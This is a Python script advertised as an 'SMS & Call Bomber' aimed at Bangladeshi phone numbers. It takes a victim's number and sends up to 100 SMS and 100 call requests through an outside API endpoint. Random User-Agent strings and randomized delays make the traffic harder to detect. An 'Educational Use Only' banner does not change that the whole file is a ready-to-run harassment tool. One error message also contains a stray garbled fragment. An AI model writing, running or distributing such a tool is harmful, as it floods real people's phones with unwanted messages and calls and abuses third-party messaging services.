import requests
import json
import time
import random
import sys
import os

# ANSI escape codes for colors
class Colors:
    GREEN = '\033[92m'  # Green for success
    RED = '\033[91m'    # Red for failed
    YELLOW = '\033[93m' # Yellow for info
    CYAN = '\033[96m'   # Cyan for input
    RESET = '\033[0m'   # Reset color

# "SM" ASCII Art
SM_ART = f"""
{Colors.CYAN}
                          _____ __  __ 
                        / ____|  \/  |
                       | (___ | \✨/ |
                        \___ \| |\/| |
                        ____) | |  | |
                       |_____/|_|  |_|

                 {Colors.YELLOW}=== SM CORPORATE 🍁 SM & Call Bomber ==={Colors.RESET}
                 Coded by: SM 🍁 
                 For Educational Use Only!
"""

# New API configuration
APIs = [
    {
        "name": "Trial API SMS",
        "url": "https://bomberdemofor2hrtcs.vercel.app/api/trialapi",
        "method": "GET",
        "params": {"phone": "{number}", "type": "sms"}
    },
    {
        "name": "Trial API Call",
        "url": "https://bomberdemofor2hrtcs.vercel.app/api/trialapi",
        "method": "GET",
        "params": {"phone": "{number}", "type": "call"}
    }
]

# Random User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

def validate_phone(phone):
    return phone.isdigit() and len(phone) == 11 and phone.startswith("01")

def send_request(api, phone):
    url = api["url"]
    params = {key: value.replace("{number}", phone) for key, value in api["params"].items()}
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
    }

    try:
        response = requests.get(url, params=params, headers=headers, timeout=10)
        if response.status_code < 400:
            return {"success": True, "status": "Success"}
        else:
            return {"success": False, "status": "Failed"}
    except requests.RequestException:
        return {"success": False, "status": "Failed"}

def main():
    clear_screen()
    print(SM_ART)
    
    # Phone number input
    phone = input(f"{Colors.CYAN}Enter Bangladeshi number (e.g., 01712345678): {Colors.RESET}").strip()
    if not validate_phone(phone):
        print(f"{Colors.RED}Invalid number! Must be 11 digits starting with 01.{Colors.RESET}")
        input("Press Enter to exit...")
        return

    # Count input for SMS and Calls
    try:
        sms_count = int(input(f"{Colors.CYAN}Enter number of SMS (1-100): {Colors.RESET}").strip())
        call_count = int(input(f"{Colors.CYAN}Enter number of Calls (1-100): {Colors.RESET}").strip())
        if not (1 <= sms_count <= 100 and 1 <= call_count <= 100):
            raise ValueError
    except ValueError:
        print(f"{Colors.RED}Invalid count! Both must be between 1 and 100.{Colors.RESET}")
        input("Press Enter to exit...")
        return

    # Delay input
    try:
        delay = float(input(f"{Colors.CYAN}Enter delay between requests (seconds, e.g., 2): {Colors.RESET}").strip())
        if delay < 0:
            raise ValueError
    except ValueError:
        print(f"{Colors.RED}ición:1 Invalid delay! Must be a non-negative number.{Colors.RESET}")
        input("Press Enter to exit...")
        return

    total_requests = sms_count + call_count
    print(f"\n{Colors.YELLOW}Starting bombing to {phone} with {sms_count} SMS and {call_count} calls (delay: {delay}s)...{Colors.RESET}")

    # Create a list of requests (SMS and Call)
    request_list = ([APIs[0]] * sms_count) + ([APIs[1]] * call_count)
    random.shuffle(request_list)  # Shuffle to mix SMS and calls

    for i, api in enumerate(request_list):
        result = send_request(api, phone)
        if result["success"]:
            print(f"{Colors.GREEN}[{i+1}/{total_requests}] {api['name']}: Success{Colors.RESET}")
        else:
            print(f"{Colors.RED}[{i+1}/{total_requests}] {api['name']}: Failed{Colors.RESET}")
        time.sleep(delay + random.uniform(0, 1))  # Delay + random 0-1s

    print(f"\n{Colors.GREEN}SMS and Call bombing completed successfully!{Colors.RESET}")
    input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Stopped by user.{Colors.RESET}")
        sys.exit(0)
